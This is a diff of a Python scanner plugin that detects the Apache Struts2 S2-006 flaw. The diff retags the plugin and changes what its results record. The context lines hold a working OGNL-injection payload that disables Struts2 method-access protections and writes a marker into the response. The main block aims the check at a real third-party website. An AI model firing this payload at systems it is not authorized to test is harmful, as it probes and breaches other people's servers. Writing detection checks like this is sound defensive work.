@@ -13,7 +13,7 @@ def info(data=None):
 
 
 def prove(data):
-    data = init(data, 'web')
+    data = init(data, 'struts')
     if data['url'] != None:
         try:
             prove_poc = "('#_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('#context[\'xwork.MethodAccessor.denyMethodExecution\']=false')(b))&('#c')(('#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET')(c))&(g)(('#req=@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('#xman=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('#xman=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('#xman.getWriter().println(%22@struts2_006_vul@%22)')(d))&(i99)(('#xman.getWriter().close()')(d))=1"
@@ -22,7 +22,7 @@ def prove(data):
             if res and res.find(poc_key) != -1:
                 data['flag'] = 1
                 data['data'].append({"poc": prove_poc})
-                data['res'].append({"info": prove_poc, "key": "struts2_006_vul"})
+                data['res'].append({"info": data['url'], "key": "struts2_006"})
         except:
             pass
     return data
@@ -30,6 +30,5 @@ def prove(data):
 
 if __name__ == '__main__':
     from script import init, curl
-
     print(prove({'url': 'http://www.baidu.com', 'flag': -1, 'data': [], 'res': []}))
 a
